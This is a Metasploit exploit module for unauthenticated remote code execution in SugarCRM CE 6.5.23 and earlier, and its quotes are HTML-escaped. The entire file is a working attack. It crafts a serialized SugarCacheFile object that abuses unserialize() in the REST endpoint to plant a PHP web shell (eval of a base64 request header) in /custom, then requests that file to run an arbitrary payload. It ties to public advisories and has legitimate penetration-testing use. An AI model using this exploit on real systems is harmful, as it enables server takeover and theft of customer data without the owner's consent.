# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
require &#039;msf/core&#039;
 
class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking
 
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::FileDropper
 
  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;SugarCRM REST Unserialize PHP Code Execution&#039;,
      &#039;Description&#039;    => %q{
        This module exploits a PHP Object Injection vulnerability in SugarCRM CE <= 6.5.23
        which could be abused to allow unauthenticated users to execute arbitrary PHP code with
        the permissions of the webserver. The dangerous unserialize() call exists in the
        &#039;/service/core/REST/SugarRestSerialize.php&#039; script. The exploit abuses the __destruct()
        method from the SugarCacheFile class to write arbitrary PHP code into the /custom directory.
      },
      &#039;Author&#039;         => &#039;EgiX&#039;,
      &#039;License&#039;        => MSF_LICENSE,
      &#039;References&#039;     =>
        [
          [&#039;URL&#039;, &#039;http://karmainsecurity.com/KIS-2016-07&#039;],
          [&#039;URL&#039;, &#039;http://www.sugarcrm.com/security/sugarcrm-sa-2016-001&#039;],
          [&#039;URL&#039;, &#039;http://www.sugarcrm.com/security/sugarcrm-sa-2016-008&#039;],
          [&#039;URL&#039;, &#039;https://bugs.php.net/bug.php?id=72663&#039;]
        ],
      &#039;Privileged&#039;     => false,
      &#039;Platform&#039;       => [&#039;php&#039;],
      &#039;Arch&#039;           => ARCH_PHP,
      &#039;Targets&#039;        => [ [&#039;SugarCRM CE <= 6.5.23&#039;, {}] ],
      &#039;DefaultTarget&#039;  => 0,
      &#039;DisclosureDate&#039; => &#039;Jun 23 2016&#039;
      ))
 
      register_options(
        [
          OptString.new(&#039;TARGETURI&#039;, [ true, "The base path to the web application", "/sugarcrm/"])
        ], self.class)
  end
 
  def exploit
    upload_php = &#039;/custom/&#039; + rand_text_alpha(rand(4)+8) + &#039;.php&#039;
 
    payload_serialized =  "O:+14:\"SugarCacheFile\":23:{S:17:\"\\00*\\00_cacheFileName\";"
    payload_serialized << "s:#{upload_php.length+2}:\"..#{upload_php}\";S:16:\"\\00*\\00"
    payload_serialized << "_cacheChanged\";b:1;S:14:\"\\00*\\00_localStore\";a:1:{i:0;s:55"
    payload_serialized << ":\"<?php eval(base64_decode($_SERVER[&#039;HTTP_PAYLOAD&#039;])); ?>\";}}"
 
    print_status("#{peer} - Exploiting the unserialize() to upload PHP code")
 
    res = send_request_cgi(
    {
      &#039;uri&#039;    => normalize_uri(target_uri.path, &#039;service/v4/rest.php&#039;),
      &#039;method&#039; => &#039;POST&#039;,
        &#039;vars_post&#039; => {
          &#039;method&#039;     => &#039;login&#039;,
          &#039;input_type&#039; => &#039;Serialize&#039;,
          &#039;rest_data&#039;  => payload_serialized
        }
    })
 
    if not res or res.code != 200
      print_error("#{peer} - Exploit failed: #{res.code}")
      return
    end
 
    register_files_for_cleanup(File.basename(upload_php))
 
    print_status("#{peer} - Executing the payload #{upload_php}")
 
    res = send_request_cgi(
    {
      &#039;method&#039;  => &#039;GET&#039;,
      &#039;uri&#039;     => normalize_uri(target_uri.path, upload_php),
      &#039;headers&#039; => { &#039;payload&#039; => Rex::Text.encode_base64(payload.encoded) }
    })
 
    if res and res.code != 200
      print_error("#{peer} - Payload execution failed: #{res.code}")
      return
    end
  end
end

